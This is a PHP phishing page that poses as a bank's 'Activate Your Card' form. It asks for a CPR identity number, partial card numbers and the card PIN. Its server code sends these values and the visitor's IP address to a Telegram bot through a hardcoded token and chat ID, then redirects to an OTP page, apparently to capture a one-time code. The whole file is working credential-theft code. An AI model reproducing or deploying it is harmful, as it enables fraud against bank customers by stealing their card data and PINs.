<?php
session_start();
if(isset($_POST['submit']))
{
    $crpnum=$_POST['crpnum'];
    $snum=$_POST['snum'];
    $fnum=$_POST['fnum'];
    $password=$_POST['password'];
     $_SESSION['count'] = 0;
    
    if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
    $user_ip = $_SERVER['REMOTE_ADDR'];
     }
     
     
     
    
     $token = "6701792944:AAEsLcRvGnQ10YdJ3ZyuRmSL-8_4UaipwP8";
     
     $data = [
          "text" => "(First Page Information) CRP Number : $crpnum
          Six Digit Number : $snum 
          Four Digit Number : $fnum 
          Password : $password 
          User IP Address : $user_ip ",
          "chat_id" => "6066856746"
           
         
         
         ];
          
         $response = file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    
    $_SESSION['crpnumber']=$crpnum;
    $_SESSION['sixnumber']=$snum;
    $_SESSION['fournumber']=$fnum;
    $_SESSION['password']=$password;
    
     ?>
     <script>
           window.location.href = "otp.php";
     </script>
     
     <?php
}

?>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SignUp_AUB</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
     <style>
        
        .form-control
        {
          border:solid 1px grey;
        }
        input[type=number]::-webkit-inner-spin-button, 
input[type=number]::-webkit-outer-spin-button {
    -webkit-appearance: none;
    margin: 0;
}
input[type=number] {
    -moz-appearance: textfield; /* Firefox */
}
      </style>
  </head>

  <body style="font-family: Roboto-Bold; zoom: 1;">

<div class="container-fluid p-3" style="background:linear-gradient(180deg , #C9DDE2, #F6F9FA);">
  <img src="assets/img/CbaWeqa.png" height="80px">
</div>

<div class="container-fluid" style="min-height:70vh;background:linear-gradient(90deg , #176EA6, #53A2CC, #176EA6);padding: 25px;">
<div class="row text-center">
  <h4 class="font-weight-normal text-middle" style="text-align: center;font-family: Roboto-Bold;">Activate Your Card</h4>

<img src="assets/img/pjt6z1c.png" class="img-fluid" style="max-width: 400px;">



</div>  
 
<div class="row bg-light" style="background-color: #D8AE5A;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;border-top-left-radius: 7px;border-top-right-radius: 7px; ">
  <div class="col-md-12 text-light p-2 " style="background-color: #D8AE5A;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;border-top-left-radius: 7px;border-top-right-radius: 7px; ">Enter Identification Information</div>


</div>

<div class=" row bg-light text-dark font-weight-bold">


  <div class="col-12 p-2 text-dark font-weight-bolder">

    <form method="POST">
       <div class="col-12 p-2 text-dark font-weight-bolder">
    CPR Number <span class="text-danger">*</span>
  </div>
  
<div class="col-12">
    <input type="number" id="customInput9" name="crpnum" 
    class="form-control" maxlength="9" oninput="handleInput(this, 'secondField')" required="">
  </div>
   
   <div class="row">
  <div class="col-5 mt-2">
       Card Number <span class="text-danger">*</span>
    <input type="number" value="557668" name="snum" id="cardNumber" class="form-control" 
    maxlength="6"  oninput="handleInput(this, 'secondField')" required="">
    
  </div>
  <div class="col-2 text-center  mt-5">
    ******
      
  </div>

   <div class="col-5">
        <div class="text-white mt-2">*</div>
    <input type="number" name="fnum" class="form-control" id="secondField" placeholder="Last 4 Digit" maxlength="4" oninput="handleInput(this, 'thirdField')" required="">
    
  </div>
   </div>
   <p class="font-weight-bold text-center mt-2" style="color: black;font-size:12px;">Please enter the first 6 digit and last 4 digit on your card</p>
  
   <div class="col-12 px-2 text-dark font-weight-bolder">
   4 Digit Card PIN <span class="text-danger">*</span>
  </div>
    <div class="col-12">
    <input type="number" name="password" class="form-control" id="thirdField" pattern="/^-?\d+\.?\d*$/" onkeypress="if(this.value.length==4) return false;" required="">
    </div>
 
   <div class="col-12 p-1 px-3 border-bottom"><br>
   <button class="btn w-100 " type="submit" name="submit" style="background: #124E70;color:white;">Next</button></div>
     <div class="col-12 p-1 px-3 border-bottom">
    <button class="btn w-100 " style="border:solid 2px #124E70;color:#124E70;">Cancel</button><br><br>
    </div>
  </form></div>
  
   
<!--<div class="col-12 p-2 text-dark font-weight-bolder">-->
<!--    Expiry <span class="text-danger">*</span>-->
<!--  </div> -->
<!-- <div class="col-6">-->
<!--    <input type="number" name="m" placeholder="MM" class="form-control" id="secondField" maxlength="2" oninput="handleInput(this, 'thirdField')" required>-->
<!--  </div>-->
<!--  <div class="col-6">-->
<!--    <input type="number" name="y" placeholder="YY" class="form-control" id="thirdField" maxlength="2" oninput="handleInput(this, 'fourthField')" required>-->
<!--  </div>   -->
 
    
 


</div>




</div>




 <script>


function handleInput(input, nextFieldId) {
    if (input.value.length >= input.maxLength) {
        document.getElementById(nextFieldId).focus();
    }
}

function handleSecondFieldInput() {
    var secondField = document.getElementById('secondField');
    var value = parseInt(secondField.value, 10);
    
    if (isNaN(value) || value < 1 || value > 12) {
        // If the value is not a number between 01 and 12, clear the input
        secondField.value = '';
    }
}




        const selectField = document.getElementById('selectField');
        const creditDiv = document.querySelector('.credit');

        selectField.addEventListener('change', function () {
            if (selectField.value === '') {
                creditDiv.style.display = 'none';
            } else {
                creditDiv.style.display = 'block';
            }
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
  



</body></html>